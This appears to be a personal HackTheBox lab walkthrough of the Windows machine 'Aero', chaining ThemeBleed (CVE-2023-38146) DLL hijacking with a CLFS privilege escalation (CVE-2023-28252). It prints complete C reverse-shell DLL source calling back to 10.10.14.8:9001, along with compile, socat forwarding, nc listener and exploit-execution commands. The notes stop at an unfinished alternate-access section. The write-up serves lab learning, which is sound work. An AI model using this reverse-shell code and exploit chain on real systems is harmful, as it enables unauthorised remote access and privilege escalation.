2024
### NMAP

```
sudo nmap -sC -sV -oN nmap-aero 10.10.11.237
```
### Enumerate for Initial Access

ThemeBleed (CVE-2023-38146) exploit for DLL hijacking


### Initial Access
#### DLL Hijacking - Create the malicious DLL
Creating a DLL that exports VerifyThemeVersion and then compiling from Linux

Ensure mingw-w64 is installed. Search for these packages using 
```
apt search mingw-w64
```

Create `main.c` file and paste `windows.c` [reverse shell code](https://github.com/izenynn/c-reverse-shell)

- Trim down some code
- Create the VerifyThemeVersion function
![[HackTheBox/Windows/attachments/Pasted image 20250523220153.png]]
```c
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);


	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}


	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}

void VerifyThemeVersion() {
	ReverseShell("10.10.14.8", 9001);
}
```

- Compile this c code!

```
x86_64-w64-mingw32-gcc-win32 main.c -shared -lws2_32 -o VerifyThemeVersion.dll
```
- `-shared` to get a dll

Confirm the function export of this dll

```
python3 -m pefile exports VerifyThemeVersion.dll
```

Test the dll to ensure it works:
- change the IP address to a different machine
- recompile the exploit
- start python web server

![[HackTheBox/Windows/attachments/Pasted image 20250523221254.png]]

- switch to said windows ip and download the dll
![[HackTheBox/Windows/attachments/Pasted image 20250523221342.png]]
- set up nc listener
- open cmd shell and run the dll using rundll32 with the export name "VerifyThemeVersion"

![[HackTheBox/Windows/attachments/Pasted image 20250523221518.png]]

This reverse shell code worked!
![[HackTheBox/Windows/attachments/Pasted image 20250523221604.png]]

#### Set up ThemeBleed Server 

Download [ThemeBleed](https://github.com/exploits-forsale/themebleed/releases) to our Windows attacc box. 

Navigate to Services (CTRL + SHIFT + ENTER) and Disable the server, and reboot the box
![[HackTheBox/Windows/attachments/Pasted image 20250523232114.png]]

Ensure that nothing is running on 445 (bc themebleed needs that port)
```
netstat -an | findstr 445
```

Create ThemeBleed exploit theme
```
.\ThemeBleed.exe make_theme 10.10.14.8 exploit.theme
```
![[HackTheBox/Windows/attachments/Pasted image 20250523232411.png]]
Then transfer this exploit.theme to Kali to upload to the target web app. 

Before that -> replace stage_3 (which just executes calc.exe) with our malicious VerifyThemeVersion.dll -> rename VerifyThemeVersion.dll to stage_3
![[HackTheBox/Windows/attachments/Pasted image 20250523232536.png]]

Now start up the ThemeBleed server 
```
.\ThemeBleed.exe server
```
![[HackTheBox/Windows/attachments/Pasted image 20250523232803.png]]

Now copy exploit.theme to kali. 

LASTLY 
#### Socat tunnel to forward to windows attacc box

Ensure VMs are in a network where they can talk. Windows attacc IP: 192.168.58.230

This will forward any traffic Kali is receiving on 445 over to Windows box.
```
sudo socat TCP-LISTEN:445,fork,reuseaddr TCP:192.168.58.230:445
```

![[HackTheBox/Windows/attachments/Pasted image 20250523233232.png]]

#### NC Listener 
To catch reverse shell 
```
nc -lvnp 9001
```
![[HackTheBox/Windows/attachments/Pasted image 20250523233324.png]]

#### Upload the exploit.theme to web app

![[HackTheBox/Windows/attachments/Pasted image 20250523233415.png]]

We got our shelllll
![[HackTheBox/Windows/attachments/Pasted image 20250523233643.png]]
❗initial access as sam.emerson❗
### Enumerate for Priv Esc 

Discover a PDF file in the user's docs

![[HackTheBox/Windows/attachments/Pasted image 20250523233834.png]]

Download PDF by converting to base64 and then copy and pasting it to our box.

#### Convert PDF to Base64
```
$b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes("CVE-2023-28252_Summary.pdf")
```

Copy the outputted base64

![[HackTheBox/Windows/attachments/Pasted image 20250523234251.png]]

and paste it into a file called "cve.pdf.b64" and decode the base 64 

```
base64 -d cve.pdf.b64 > cve.pdf
```

This document references CVE-2023-28252 which is a Windows Local Privesc in the Common Log File System (CLFS) and patched back in April 2023.
### Priv Esc

Find the PoC for this [CVE-2023-28252](https://github.com/fortra/CVE-2023-28252). 

Open this repository up in Visual Studio and ensure we're in release mode on the `clfs_eop.cpp` file

![[HackTheBox/Windows/attachments/Pasted image 20250523235101.png]]

Locate the benign execution of notepad.exe and replace with a reverse shell. 

From this 
![[HackTheBox/Windows/attachments/Pasted image 20250523235227.png]]

To this 
![[HackTheBox/Windows/attachments/Pasted image 20250524000157.png]]
Save this and Build > Rebuild Solution

![[HackTheBox/Windows/attachments/Pasted image 20250523235357.png]]

Executable is saved here
![[HackTheBox/Windows/attachments/Pasted image 20250523235438.png]]

Move this executable to Kali VM. 

#### Use Nishang's Invoke-PowerShellTcpOneLine.ps1 as Reverse Shell

![[HackTheBox/Windows/attachments/Pasted image 20250523235718.png]]

- Rename this shell to shell.ps1
- Uncomment and customize 
shell.ps1
![[HackTheBox/Windows/attachments/Pasted image 20250523235838.png]]

Now set up #pythonhttpserver  and #nc listener 

![[HackTheBox/Windows/attachments/Pasted image 20250523235933.png]]

Then curl the clfs_eop.exe from initial access shell
![[HackTheBox/Windows/attachments/Pasted image 20250524000025.png]]

Execute clfs_eop.exe

Catch elevated shell woot


![[HackTheBox/Windows/attachments/Pasted image 20250524000259.png]]

⭐got root⭐

### Alternate Initial Access: DLL Hijacking

Instead of exporting VerifyThemeVersion

![[HackTheBox/Windows/attachments/Pasted image 20250524000633.png]]
